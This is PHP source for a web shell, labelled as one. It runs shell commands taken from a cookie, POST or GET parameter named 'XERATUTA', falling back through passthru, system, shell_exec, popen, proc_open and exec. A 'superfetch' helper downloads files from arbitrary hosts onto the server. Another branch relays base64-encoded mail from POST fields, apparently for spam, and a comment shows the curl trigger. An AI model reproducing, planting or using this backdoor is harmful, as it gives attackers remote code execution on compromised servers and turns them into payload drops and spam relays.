<?php

/// WebShell

$n='XERATUTA';
$c=$_COOKIE[$n];
if(@empty($c)){$c=$_POST[$n];}
if(@empty($c)){$c=$_GET[$n];}
if(@get_magic_quotes_gpc()){$c=stripslashes($c);}
if ($c) {
//curl -v --cookie "XERATUTA=w" URL
//adjust system variables
if(!@isset($_SERVER)){$_COOKIE=&$HTTP_COOKIE_VARS;$_POST=&$HTTP_POST_VARS;$_GET=&$HTTP_GET_VARS;}
//die with error
function x_die($m){@header('HTTP/1.1 500 '.$m);@die();}
//check if we can exec
define('has_passthru',@function_exists('passthru'));
define('has_system',@function_exists('system'));
define('has_shell_exec',@function_exists('shell_exec'));
define('has_popen',@function_exists('popen'));
define('has_proc_open',@function_exists('proc_open'));
define('has_exec',@function_exists('exec'));
define('can_exec',(has_passthru||has_system||has_shell_exec||has_popen||has_proc_open||has_exec));
if(!can_exec){x_die('can not exec: no functions available');}
//check if we can config
define('has_ini_get',@function_exists('ini_get'));
define('has_ini_get_all',@function_exists('ini_get_all'));
define('can_config',(has_ini_get||has_ini_get_all));
if(!can_config){x_die('can not config');}
//get config value
function x_ini_get($n){if(has_ini_get){return(@ini_get($n));}elseif(has_ini_get_all){$h=@ini_get_all();return($h[$n]['local_value']);}}
// check safe mode
if(x_ini_get('safe_mode')){x_die('can not exec: safe mode active');}
//smart exec helpers
function x_passthru($c){@passthru($c);}
function x_system($c){@system($c);}
function x_shell_exec($c){echo @shell_exec($c);}
function x_popen($c){$o;if(($f=@popen($c,'r'))){while(!@feof($f)){$o.=@fgets($f);}@pclose($f);}echo $o;}
function x_proc_open($c){$o;if(@is_resource($p=@proc_open($c,array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')),$f))){@fclose($f[0]);while(!@feof($f[1])){$o.=@fgets($f[1]);}@fclose($f[1]);@proc_close($p);}echo $o;}
function x_exec($c){$o;@exec($c,$o);echo @implode("\n",$o);}
//do smart fetch
function x_superfetch($a,$p,$r,$l)
{
        if($s=@fsockopen($a,$p))
        {
                if($f=@fopen($l,"wb"))
                {
                        @fwrite($s,"GET ".$r." HTTP/1.0\r\n\r\n");
                        while(!@feof($s))
                        {
                                $b=@fread($s,8192);
                                @fwrite($f,$b);
                        }
                        @fclose($f);
                        echo "OK\n";
                }
                @fclose($s);
        }
}
//do smart exec
function x_smart_exec($c)
{
        if($c==="which superfetch 1> /dev/null 2> /dev/null && echo OK")
        {
                echo "OK\n";
        }
        elseif(@strstr($c,"superfetch"))
        {
                $a=@explode(' ',$c);
                x_superfetch($a[1],$a[2],$a[3],$a[4]);
        }
        elseif(has_passthru){x_passthru($c);}
        elseif(has_system){x_system($c);}
        elseif(has_shell_exec){x_shell_exec($c);}
        elseif(has_popen){x_popen($c);}
        elseif(has_proc_open){x_proc_open($c);}
        elseif(has_exec){x_exec($c);}
}
//go
$n='XERATUTA';
$c=$_COOKIE[$n];
if(@empty($c)){$c=$_POST[$n];}
if(@empty($c)){$c=$_GET[$n];}
if(@get_magic_quotes_gpc()){$c=stripslashes($c);}
if ($c) x_smart_exec($c);


} else {

//########## AMS ############

if(isset($_POST["mailto"]))
        $MailTo = base64_decode($_POST["mailto"]);
else
        {
        echo "indata_error";
        exit;
        }
if(isset($_POST["msgheader"]))
        $MessageHeader = base64_decode($_POST["msgheader"]);
else
        {
        echo "indata_error";
        exit;
        }
if(isset($_POST["msgbody"]))
        $MessageBody = base64_decode($_POST["msgbody"]);
else
        {
        echo "indata_error";
        exit;
        }
if(isset($_POST["msgsubject"]))
        $MessageSubject = base64_decode($_POST["msgsubject"]);
else
        {
        echo "indata_error";
        exit;
        }
if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader)) {
        echo "sent_ok";
}
else {
        echo "sent_error";
}

}
?>
